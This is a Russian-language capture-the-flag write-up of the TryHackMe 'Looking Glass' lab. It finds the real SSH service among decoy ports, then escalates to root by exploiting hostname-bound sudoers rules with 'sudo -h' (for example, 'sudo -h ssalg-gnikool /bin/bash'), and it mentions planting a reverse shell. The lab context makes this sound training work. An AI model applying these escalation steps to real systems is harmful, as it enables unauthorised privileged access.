# TryHackMe — Looking Glass

## Технический отчёт по исследованию и эксплуатации лабораторной машины

## 1. Общая информация

**Название машины:** Looking Glass
**Платформа:** TryHackMe
**IP-адрес:** `10.48.129.21` (первоначальный), далее `10.49.163.111` после перезапуска
**ОС:** Linux / Ubuntu
**Цель:** получение первоначального доступа к системе, исследование сервисов, получение пользовательских флагов и эскалация привилегий до `root`.

В ходе исследования были обнаружены нестандартные SSH-сервисы Dropbear, реализована автоматизация поиска скрытого SSH-порта, расшифрована криптографическая загадка, получен первоначальный доступ к системе и исследованы несколько способов повышения привилегий.

# 3. Исследование SSH и поиск скрытого сервиса

### 3.1. Проблема согласования алгоритмов SSH

При попытке подключиться к одному из нестандартных SSH-портов возникла ошибка:

```
Unable to negotiate with 10.48.129.21 port 13000:
no matching host key type found.
Their offer: ssh-rsa
```

Причина заключается в том, что сервер использует устаревший алгоритм host key `ssh-rsa`, который современные версии OpenSSH по умолчанию могут не принимать.

Для решения проблемы были явно разрешены необходимые алгоритмы:

```
ssh -oHostKeyAlgorithms=+ssh-rsa \
    -oPubkeyAcceptedAlgorithms=+ssh-rsa \
    alice@10.48.129.21 -p 13000
```

После подключения сервис возвращал ответ:

```
higher
```

Это стало дополнительной подсказкой о том, что необходимо продолжить поиск правильного порта.


### 3.2. Автоматизация поиска SSH-порта

В связи с большим количеством нестандартных портов была реализована автоматизация поиска SSH-сервисов в диапазоне `9000–14000`.

Целью являлось последовательное подключение к обнаруженным портам и анализ возвращаемых ответов.

В ходе поиска были получены следующие результаты:

```
Порт: 13999
13999 higher
FOUND PORT 14000 !!!
```

Далее было замечено, что ответы сервиса позволяют ориентироваться в поиске, используя принцип обратного направления.

По результатам дальнейшего перебора был найден порт:

```
FOUND PORT 10057 !!!
```

При подключении к нему появилось предупреждение о добавлении SSH host key:

```
Warning: Permanently added '[10.48.129.21]:10057' (RSA) to the list of known hosts.
```

Также OpenSSH вывел предупреждение о том, что соединение использует обмен ключами без постквантовой защиты:

```
WARNING: connection is not using a post-quantum key exchange algorithm.
This session may be vulnerable to "store now, decrypt later" attacks.
```

После подключения сервер сообщил:

```
You've found the real service.
Solve the challenge to get access to the box
```

Таким образом, порт `10057` оказался настоящей точкой входа, в отличие от многочисленных ложных SSH-сервисов.

# 7. Проблема с hostname и обнаружение sudo misconfiguration

В ходе дальнейшего исследования было установлено, что машина имеет особенность изменения hostname после запуска.

Первоначально hostname машины:

```
looking-glass
```

После запуска система меняет hostname на имя, соответствующее её IP-адресу, например:

```
ip-10-49-163-111
```

Данное поведение оказалось критически важным для дальнейшей эксплуатации.

### 7.1. Исследование sudo с указанием hostname

Для проверки sudo-конфигурации была использована опция `-h`, позволяющая указать hostname, для которого необходимо проверить sudo-права:

```
sudo -l -h looking-glass
```

В результате была получена ошибка разрешения имени:

```
sudo: unable to resolve host looking-glass
```

Однако одновременно sudo показал правила, применимые к hostname `looking-glass`:

```
Matching Defaults entries for jabberwock on looking-glass:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jabberwock may run the following commands on looking-glass:
    (root) NOPASSWD: /sbin/reboot
```

Это позволило обнаружить правило sudoers, предоставляющее пользователю `jabberwock` возможность выполнить `/sbin/reboot` от имени `root` без ввода пароля, если hostname соответствует `looking-glass`.

### 7.2. Использование sudo для перезапуска системы

Для выполнения команды был указан hostname, соответствующий правилу sudoers:

```
sudo -h looking-glass /sbin/reboot
```

В результате:

```
sudo: unable to resolve host looking-glass
Connection to 10.49.163.111 closed by remote host.
Connection to 10.49.163.111 closed.
```

Несмотря на предупреждение о разрешении hostname, команда перезапуска была выполнена.

После перезапуска удалось получить доступ к системе под пользователем после внедрения revshell:

```
uid=1002(tweedledum) gid=1002(tweedledum) groups=1002(tweedledum)
```

Таким образом, был получен доступ к следующему пользователю — `tweedledum`.

# 10. Эскалация привилегий от alice до root

### 10.1. Повторная проверка sudo

В ходе дальнейшего исследования было установлено, что при обычном выполнении:

```
sudo -l
```

не отображается ожидаемое правило:

```
NOPASSWD: /bin/bash
```

Однако это правило существовало в sudoers и было привязано к определённому hostname.

### 10.2. Обнаружение hostname-specific sudoers rule

В ходе исследования конфигурации sudoers был обнаружен файл:

```
/etc/sudoers.d/alice
```

Его содержимое:

```
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```

Hostname:

```
ssalg-gnikool
```

является строкой `looking-glass`, записанной в обратном порядке.

Таким образом, sudo-правило для `alice` было привязано не к текущему hostname машины, а к альтернативному имени.

### 10.3. Использование альтернативного hostname

Для проверки правила был указан hostname, соответствующий конфигурации sudoers:

```
sudo -h ssalg-gnikool /bin/bash
```

В результате удалось запустить Bash с привилегиями `root`.

Проверка текущего hostname показала:

```
hostname
```

Результат:

```
ip-10-49-163-111
```

После получения root-доступа был прочитан root-флаг.

Таким образом, была успешно завершена эскалация привилегий до `root`.


# 11. Анализ конфигурации sudoers

В ходе исследования были обнаружены следующие правила:

```
root@ip-10-49-163-111:/etc/sudoers.d# cat alice

alice ssalg-gnikool = (root) NOPASSWD: /bin/bash

tweedledum looking-glass = (tweedledee) NOPASSWD: /bin/bash
tweedledee looking-glass = (tweedledum) NOPASSWD: /bin/bash
```

Данные правила демонстрируют использование hostname-specific конфигурации sudoers.

Для пользователя `alice` разрешён запуск `/bin/bash` от `root` при hostname:

```
ssalg-gnikool
```

Для пользователей `tweedledum` и `tweedledee` предусмотрены взаимные правила запуска Bash от имени друг друга при hostname:

```
looking-glass
```

Эти правила объясняют особенности переходов между пользователями и возможность эскалации привилегий при корректном выборе hostname.


# 12. Причина проблемы с hostname и отличие от стандартного прохождения

В ходе эксплуатации возникла проблема, из-за которой стандартные способы получения привилегий, описанные в других write-up, не работали ожидаемым образом.

### 12.1. Первоначальный hostname

Изначально машина использует hostname:

```
looking-glass
```

В файле `/etc/hosts` присутствует запись:

```
127.0.1.1 looking-glass
```

Однако после запуска система меняет hostname на имя, соответствующее IP-адресу:

```
ip-10-49-163-111
```

Таким образом, фактический hostname работающей системы перестаёт совпадать с `looking-glass`.

### 12.2. Почему sudo перестал работать так, как ожидалось

Sudoers позволяет привязывать правила не только к пользователю, но и к hostname системы.

Например:

```
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```

Это правило означает, что пользователь `alice` может выполнить `/bin/bash` от `root` без пароля, если hostname соответствует `ssalg-gnikool`.

В нашем случае hostname системы после запуска изменился:

```
ip-10-49-163-111
```

Поэтому при обычном вызове:

```
sudo -l
```

sudo проверял правила, применимые к текущему hostname, и не отображал ожидаемое разрешение на запуск Bash от root.

Аналогичная ситуация возникла с правилами, привязанными к hostname `looking-glass`.

### 12.3. Почему использование `sudo -h` решило проблему

Опция `-h` позволяет указать hostname, для которого sudo должно рассматривать правила.

Например:

```
sudo -h looking-glass -l
```

или запуск разрешённой команды:

```
sudo -h looking-glass /sbin/reboot
```

Для пользователя `alice`:

```
sudo -h ssalg-gnikool /bin/bash
```

В результате удалось обратиться к правилам sudoers, которые не совпадали с текущим hostname системы.

Именно несовпадение фактического hostname с hostname, указанными в sudoers, стало причиной того, что стандартное прохождение комнаты не работало так, как ожидалось.

Также не было возможности изучить /etc/sudoers.d файлы из-за пермишенов, чтобы узнать с какими правилами сработает sudo.
